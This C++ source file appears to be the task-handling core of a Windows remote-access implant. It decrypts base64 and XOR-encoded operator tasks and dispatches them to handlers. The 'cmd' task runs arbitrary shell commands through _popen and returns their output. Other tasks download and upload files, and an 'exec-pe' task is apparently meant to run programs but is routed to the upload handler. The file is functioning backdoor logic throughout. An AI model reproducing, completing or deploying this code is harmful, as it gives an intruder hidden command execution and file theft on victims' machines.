#include "task.h"
#include "base64.h"
#include "crypt.h"
#include "file_utils.h"
#include "config.h"
#include <cstdio>
#include <windows.h>
#include <string>
#include <vector>
#include <iostream>

std::string exec_cmd(const std::string& cmd) {
    std::string result;
    char buffer[512];
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "Error opening pipe";
    while (fgets(buffer, sizeof(buffer), pipe) != NULL)
        result += buffer;
    _pclose(pipe);
    return result;
}

std::string get_filename(std::string data) {
    const std::string key = "'filename':";
    size_t pos = data.find(key);
    pos += key.length();
    pos = data.find('\'', pos);
    pos++;
    size_t fin = data.find('\'', pos);
    return data.substr(pos, fin - pos);
}

std::string get_filecontent(std::string data) {
    const std::string key = "'content':";
    size_t pos = data.find(key);
    pos += key.length();
    pos = data.find('\'', pos);
    pos++;
    size_t fin = data.find('\'', pos);
    return data.substr(pos, fin - pos);
}

std::string handle_upload(std::string data) {
    std::string file_props = base64_decode(data);
    std::string filename = get_filename(file_props);
    std::string b64_encoded_filecontent = get_filecontent(file_props);
    return save_base64_file(filename, b64_encoded_filecontent);
}

std::string get_task_content(const std::string& json) {
    std::string key = "\"task\":\"";
    size_t start = json.find(key);
    if (start == std::string::npos) return "";
    start += key.length();
    size_t end = json.find("\"", start);
    if (end == std::string::npos) return "";
    return json.substr(start, end - start);
}

void parse_type_and_value(const std::string& task, std::string& type, std::string& value) {
    size_t sep1 = task.find('\'');
    if (sep1 == std::string::npos) return;
    size_t sep2 = task.find('\'', sep1 + 1);
    if (sep2 == std::string::npos) return;
    type = task.substr(sep1 + 1, sep2 - sep1 - 1);
    size_t sep3 = task.find('\'', sep2 + 1);
    if (sep3 == std::string::npos) return;
    size_t sep4 = task.find('\'', sep3 + 1);
    if (sep4 == std::string::npos) return;
    value = task.substr(sep3 + 1, sep4 - sep3 - 1);
}

std::string parse_task(std::string b64_encoded_task) {
    std::string xored_task = base64_decode(b64_encoded_task);
    std::string clear_task = xor_data(xored_task, XOR_KEY);
    std::string task = get_task_content(clear_task);
    std::string type, data;
    parse_type_and_value(task, type, data);

    if (type == "cmd") {
        std::string data_res = exec_cmd(data);
        return base64_encode(data_res);
    }
    else if (type == "download") {
        return handle_download(data);
    }
    else if (type == "upload") {
        return handle_upload(data);
    }
    else if (type == "exec-pe") {
        return handle_upload(data);
    }
    return "";
}
